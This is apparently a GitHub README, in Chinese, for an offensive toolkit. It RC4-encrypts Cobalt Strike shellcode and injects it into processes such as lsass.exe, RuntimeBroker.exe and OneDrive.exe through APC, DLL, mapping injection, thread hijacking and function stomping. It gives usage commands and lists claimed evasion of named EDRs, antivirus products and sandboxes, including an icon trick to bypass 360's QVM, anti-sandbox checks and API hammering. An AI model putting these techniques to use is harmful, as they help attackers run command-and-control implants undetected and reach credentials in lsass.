# EncryptTools
对你的CS生成的Raw Bin进行RC4加密，确保你的bin不会直接落地秒杀 

## Usage:  
将你的Bin改名为cs.bin，然后放在EncryptTools的同目录下，运行Encrypt之后，自己将生成的cs.cna改成新的bin文件去用
![encryptTools](https://github.com/whoami-juruo/InjectTools/blob/main/img/encryptTools.png)

# InjectTools

一款集成了DLL-Session0注入，APC注入，映射注入，线程劫持，函数踩踏，提权的工具(支持BIN加解密)

Function : DLL-Inject ，APC-Inject , Mapping Inject , Thread HiJacking , Function Stomping 

## Usage:  

### APC注入 
Example:  

InjectTools.exe 你要注入的程序 DLL完整路径  

InjectTools.exe  lsass.exe  C:\Users\ASUS\Desktop\artifact_x64.dll

![APCInject](https://github.com/whoami-juruo/InjectTools/blob/main/img/APCInject.png)

### DLL注入 

example:  

InjectTools.exe 你要注入的程序 DLL完整路径  

InjectTools.exe  lsass.exe  C:\Users\users\Desktop\artifact_x64.dll

![DLLInject](https://github.com/whoami-juruo/InjectTools/blob/main/img/DLLInject.png)

### 远程线程劫持 (加密BIN)
example:   //这里建议RuntimeBroker

InjectTools.exe 你要注入的程序 加密BIN完整路径 

InjectTools.exe  RuntimeBroker.exe  C:\Users\users\Desktop\artifact_x64.bin

![RemoteThreadHiJacking](https://github.com/whoami-juruo/InjectTools/blob/main/img/RemoteThreadHiJacking.png)

### 映射注入 (加密BIN)

example:

InjectTools.exe  你要注入的程序   加密BIN完整路径

InjectTools.exe  OneDrive.exe  C:\Users\users\Desktop\artifact_x64.bin

![MappingInject](https://github.com/whoami-juruo/InjectTools/blob/main/img/MappingInject.png)

### 函数踩踏 (加密BIN)

InjectTools.exe  目标程序   加密BIN完整路径
目标程序加载的BIN  要踩踏的函数

InjectTools.exe  Notepad.exe   C:\Users\users\Desktop\artifact_x64.bin

User32.dll  GetFocus 

![FunctionStomping](https://github.com/whoami-juruo/InjectTools/blob/main/img/FunctionStomping.png)
<!-- Blank -->
<!-- Blank -->

### Anti-Virus

## SandBox (2024.8.13)

VT  (IKARUS。。。。给我报cobaltstrike是真抽象了吧）
![VT](https://github.com/whoami-juruo/InjectTools/blob/main/img/VT.png)

微步
![ThreatBook](https://github.com/whoami-juruo/InjectTools/blob/main/img/ThreatBook.png)

360沙箱
![360沙箱](https://github.com/whoami-juruo/InjectTools/blob/main/img/360沙箱.png)

## EDR (2024.8.13)
McAfee EDR + FireEye Combined !!
![McAFeeEDR](https://github.com/whoami-juruo/InjectTools/blob/main/img/McAFeeEDR.png)

Kaspersky EDR
![KasperskyEDR](https://github.com/whoami-juruo/InjectTools/blob/main/img/KasperskyEDR.png)


## AV  (2024.8.13)

火绒
![火绒](https://github.com/whoami-juruo/InjectTools/blob/main/img/火绒.png)

Windows Defender  
![WindowsDefender](https://github.com/whoami-juruo/InjectTools/blob/main/img/WindowsDefender.png)

360全家桶  添加VLC图标绕过QVM
![360全家桶](https://github.com/whoami-juruo/InjectTools/blob/main/img/360全家桶.png)

ESET
![ESET](https://github.com/whoami-juruo/InjectTools/blob/main/img/ESET.png)

赛门铁克
![Symantec](https://github.com/whoami-juruo/InjectTools/blob/main/img/Symantec.png)

## TODO 

- [√] 普通动态调用静态过大部分杀软
- [√] ICON,详细信息
- [√] 反沙箱
- [√] 普通API Hammering
- [√] 实现文件加解密操作
- [ ] 新的模块功能引入
- [ ] PEB寻址
- [ ] ....


